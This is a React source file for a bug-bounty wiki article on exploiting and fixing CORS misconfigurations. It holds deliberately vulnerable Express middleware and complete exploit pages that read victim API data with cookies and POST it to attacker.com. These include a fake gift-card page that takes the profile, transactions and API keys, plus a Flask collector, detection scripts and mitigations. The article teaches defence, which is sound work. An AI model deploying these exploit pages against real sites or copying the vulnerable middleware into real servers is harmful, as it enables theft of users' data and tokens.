/**
 * CORS MISCONFIGURATION
 * Exploit misconfigured CORS for data theft (English version)
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Shield, Lock, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function CORSMisconfigurationContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduction" title="CORS - When the Browser Trusts Everyone">
        <Paragraph>
          Misconfigured <Strong>Cross-Origin Resource Sharing (CORS)</Strong> allows 
          malicious sites to read responses from APIs that should be protected, 
          exposing sensitive data and session tokens.
        </Paragraph>

        <AlertDanger title="Vulnerable CORS Impact">
          <ul className="mt-2 space-y-1">
            <ListItem>🔐 Theft of sensitive data (profile, transactions)</ListItem>
            <ListItem>🎯 Account takeover via session hijacking</ListItem>
            <ListItem>💰 API token theft</ListItem>
            <ListItem>📧 Private information exfiltration</ListItem>
            <ListItem>🔑 Authentication bypass</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="fundamentals" title="1. CORS - How It Works">
        <Paragraph>
          By default, browsers block cross-origin requests (SOP - Same-Origin Policy). 
          CORS allows servers to specify which origins can access.
        </Paragraph>

        <CodeBlock
          language="http"
          title="Cross-origin request with credentials"
          code={`GET /api/user/profile HTTP/1.1
Host: api.victim.com
Origin: https://attacker.com
Cookie: session=abc123

# Browser sends Origin header
# If server responds with appropriate CORS headers → Request allowed`}
        />

        <CodeBlock
          language="http"
          title="Server response"
          code={`HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

{"username": "john", "email": "john@victim.com", "ssn": "123-45-6789"}

# Access-Control-Allow-Origin: Allows attacker.com
# Access-Control-Allow-Credentials: Includes cookies in request
# → attacker.com can read response ✓`}
        />
      </Section>

      <Section id="wildcard-vulnerable" title="2. Wildcard (*) with Credentials - Impossible Configuration">
        <CodeBlock
          language="javascript"
          title="❌ ATTEMPTED but browser blocks it"
          code={`// This does NOT work (browser prevents it):
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// Console error:
// "The value of the 'Access-Control-Allow-Origin' header in the response 
//  must not be the wildcard '*' when the request's credentials mode is 'include'"`}
        />

        <AlertInfo>
          Browsers do NOT allow <InlineCode>Access-Control-Allow-Origin: *</InlineCode> with 
          <InlineCode>Access-Control-Allow-Credentials: true</InlineCode> simultaneously.
        </AlertInfo>
      </Section>

      <Section id="reflect-origin" title="3. Reflect Origin - Critical Vulnerability">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Reflect Origin header without validation"
          code={`// Vulnerable Express.js middleware
app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ❌ VULNERABLE - Reflect any origin
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  next();
});

// Any site can read private responses ✓`}
        />

        <CodeBlock
          language="html"
          title="Exploit - Steal data from attacker.com"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>Win a Prize! 🎁</h1>
  
  <script>
    // Make request with credentials to vulnerable API
    fetch('https://api.victim.com/user/profile', {
      credentials: 'include'  // ← Include cookies
    })
    .then(response => response.json())
    .then(data => {
      // Stolen sensitive data
      console.log('Stolen data:', data);
      
      // Exfiltrate to attacker's server
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
  </script>
</body>
</html>

<!-- Victim visits attacker.com while logged into victim.com
Result: Profile data exfiltrated ✓
-->`}
        />
      </Section>

      <Section id="null-origin" title="4. null Origin - Validation Bypass">
        <Paragraph>
          Some servers allow <InlineCode>Origin: null</InlineCode> thinking it's safe. 
          But sandboxed iframes generate <InlineCode>Origin: null</InlineCode>.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Allow null origin"
          code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ❌ VULNERABLE - Allow null
  const allowedOrigins = ['https://trusted.com', 'null'];
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});`}
        />

        <CodeBlock
          language="html"
          title="Exploit - Generate Origin: null with sandbox iframe"
          code={`<!DOCTYPE html>
<html>
<body>
  <iframe sandbox="allow-scripts allow-same-origin" srcdoc="
    <script>
      fetch('https://api.victim.com/user/data', {
        credentials: 'include'
      })
      .then(r => r.json())
      .then(data => {
        parent.postMessage(data, '*');
      });
    </script>
  "></iframe>
  
  <script>
    window.addEventListener('message', (event) => {
      console.log('Stolen via null origin:', event.data);
      
      // Exfiltrate
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(event.data)
      });
    });
  </script>
</body>
</html>

<!-- sandbox iframe → Origin: null
Server allows null → Data read ✓
-->`}
        />
      </Section>

      <Section id="subdomain-wildcard" title="5. Subdomain Wildcard - Poorly Implemented Regex">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Regex bypass"
          code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ❌ VULNERABLE - Regex without anchors
  if (origin && origin.match(/victim\\.com/)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});

// Bypass:
// Origin: https://victim.com.attacker.com → Match ✓
// Origin: https://attackervictim.com → Match ✓`}
        />

        <CodeBlock
          language="javascript"
          title="Exploit - Register malicious domain"
          code={`// Attacker registers: victim.com.attacker.com

// HTML on attacker.com:
fetch('https://api.victim.com/data', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Regex match: victim.com.attacker.com contains "victim.com"
  // CORS allows reading response → Data stolen ✓
  
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});`}
        />
      </Section>

      <Section id="pre-domain-wildcard" title="6. Pre-Domain Wildcard Bypass">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Validation with endsWith"
          code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ❌ VULNERABLE - Only check if ends with victim.com
  if (origin && origin.endsWith('.victim.com')) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});

// Bypass:
// Origin: https://attacker.com.victim.com (if attacker controls subdomain)
// Origin: https://evil-victim.com (if ends with victim.com)`}
        />
      </Section>

      <Section id="complete-exploit" title="7. Complete Exploit - Token Theft">
        <CodeBlock
          language="html"
          title="Attacker's page - Steal JWT token"
          code={`<!DOCTYPE html>
<html>
<head>
  <title>Free Gift Card!</title>
</head>
<body>
  <h1>Congratulations! You won a $500 Amazon Gift Card! 🎉</h1>
  <p>Click below to claim...</p>
  
  <script>
    // Exfiltration functions
    async function stealData() {
      try {
        // 1. Steal user profile
        const profile = await fetch('https://api.victim.com/user/profile', {
          credentials: 'include'
        }).then(r => r.json());
        
        console.log('[+] Profile stolen:', profile);
        
        // 2. Steal transaction list
        const transactions = await fetch('https://api.victim.com/transactions', {
          credentials: 'include'
        }).then(r => r.json());
        
        console.log('[+] Transactions stolen:', transactions);
        
        // 3. Steal API tokens
        const tokens = await fetch('https://api.victim.com/api-keys', {
          credentials: 'include'
        }).then(r => r.json());
        
        console.log('[+] API keys stolen:', tokens);
        
        // 4. Exfiltrate everything to attacker's server
        const stolenData = {
          profile,
          transactions,
          tokens,
          timestamp: new Date().toISOString(),
          victimUA: navigator.userAgent
        };
        
        await fetch('https://attacker.com/api/exfiltrate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(stolenData)
        });
        
        console.log('[+] Data exfiltrated successfully');
        
        // 5. Redirect to legitimate page
        window.location = 'https://victim.com/sorry-expired';
        
      } catch (error) {
        console.error('[-] Exploit failed:', error);
      }
    }
    
    // Execute exploit when page loads
    stealData();
  </script>
</body>
</html>`}
        />

        <CodeBlock
          language="python"
          title="Attacker's server - Receive data"
          code={`from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/api/exfiltrate', methods=['POST'])
def exfiltrate():
    data = request.json
    
    print('[+] DATA STOLEN:')
    print(json.dumps(data, indent=2))
    
    # Save to database
    with open('stolen_data.json', 'a') as f:
        f.write(json.dumps(data) + '\\n')
    
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')`}
        />
      </Section>

      <Section id="detection" title="8. Detect CORS Misconfiguration">
        <CodeBlock
          language="bash"
          title="Manual testing with curl"
          code={`# Test reflect origin
curl -H "Origin: https://attacker.com" \\
  -H "Cookie: session=abc123" \\
  -i https://api.victim.com/user/profile

# If response contains:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true
# → VULNERABLE ✓

# Test null origin
curl -H "Origin: null" \\
  -H "Cookie: session=abc123" \\
  -i https://api.victim.com/api/data

# Test subdomain bypass
curl -H "Origin: https://victim.com.attacker.com" \\
  -H "Cookie: session=abc123" \\
  -i https://api.victim.com/endpoint`}
        />

        <CodeBlock
          language="python"
          title="Automated script - Detect CORS issues"
          code={`import requests

TARGET = 'https://api.victim.com/user/profile'
COOKIE = 'session=abc123'

test_origins = [
    'https://attacker.com',
    'null',
    'https://victim.com.attacker.com',
    'https://attackervictim.com',
    'https://evil.victim.com'
]

for origin in test_origins:
    headers = {
        'Origin': origin,
        'Cookie': COOKIE
    }
    
    response = requests.get(TARGET, headers=headers)
    
    acao = response.headers.get('Access-Control-Allow-Origin')
    acac = response.headers.get('Access-Control-Allow-Credentials')
    
    if acao and acac == 'true':
        print(f'[!] VULNERABLE with Origin: {origin}')
        print(f'    ACAO: {acao}')
        print(f'    ACAC: {acac}')
        print(f'    Response: {response.text[:100]}...')
        print()
    else:
        print(f'[-] Not vulnerable with: {origin}')`}
        />
      </Section>

      <Section id="mitigation" title="Complete Mitigation">
        <AlertDanger title="✅ Secure CORS">
          Implement strict whitelist and proper validation.
        </AlertDanger>

        <Subsection title="1. Strict Origins Whitelist">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Exact match of allowed origins"
            code={`const ALLOWED_ORIGINS = [
  'https://app.victim.com',
  'https://admin.victim.com',
  'https://mobile.victim.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ✅ Exact match - No regex, no wildcards
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  } else {
    // DON'T set CORS headers if origin not in whitelist
    console.warn(\`Blocked CORS request from: \${origin}\`);
  }
  
  next();
});`}
          />
        </Subsection>

        <Subsection title="2. Subdomain Validation with Safe Regex">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Regex with anchors"
            code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ✅ Regex with ^ and $ (anchors)
  const allowedPattern = /^https:\\/\\/([a-z0-9-]+\\.)?victim\\.com$/;
  
  if (origin && allowedPattern.test(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});

// Allows:
// https://victim.com ✓
// https://app.victim.com ✓
// https://api.victim.com ✓

// Blocks:
// https://victim.com.attacker.com ✗ (no match)
// https://attackervictim.com ✗ (no match)
// http://victim.com ✗ (http, not https)`}
          />
        </Subsection>

        <Subsection title="3. DO NOT Allow null Origin">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Reject null"
            code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ✅ Explicitly reject null
  if (!origin || origin === 'null') {
    // Don't set CORS headers
    return next();
  }
  
  // Validate against whitelist
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});`}
          />
        </Subsection>

        <Subsection title="4. Vary: Origin Header">
          <CodeBlock
            language="javascript"
            title="✅ Important for caching"
            code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    
    // ✅ Vary header prevents cache poisoning
    res.setHeader('Vary', 'Origin');
  }
  
  next();
});

// Vary: Origin ensures cache considers Origin header
// Prevents cached response with Origin: attacker.com
// from being served to request with Origin: victim.com`}
          />
        </Subsection>

        <Subsection title="5. Preflight Requests (OPTIONS)">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Handle OPTIONS correctly"
            code={`app.options('*', (req, res) => {
  const origin = req.headers.origin;
  
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '86400');  // Cache 24h
  }
  
  res.status(204).end();
});`}
          />
        </Subsection>

        <Subsection title="6. Use Secure CORS Middleware">
          <CodeBlock
            language="javascript"
            title="✅ Express CORS middleware properly configured"
            code={`const cors = require('cors');

const corsOptions = {
  origin: function (origin, callback) {
    // ✅ Allow requests without Origin (same-origin, Postman, etc.)
    if (!origin) return callback(null, true);
    
    // ✅ Verify against whitelist
    if (ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,  // Allow cookies
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));`}
          />
        </Subsection>

        <Subsection title="7. Alternative: Tokens in Headers (No Cookies)">
          <CodeBlock
            language="javascript"
            title="✅ BETTER - Avoid credentials: include"
            code={`// Instead of using cookies + CORS credentials:

// Client:
fetch('https://api.victim.com/data', {
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  }
  // credentials: 'include' NOT needed
})

// Server:
app.use((req, res, next) => {
  // ✅ Allow origins without credentials
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  // DON'T set Allow-Credentials
  // Tokens in Authorization header, not cookies
  
  next();
});

// Advantages:
// - Doesn't need Access-Control-Allow-Credentials
// - Can use wildcard (*)
// - More secure against CSRF`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next: Subdomain Takeover</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/subdomain-takeover`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Take control of abandoned subdomains</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
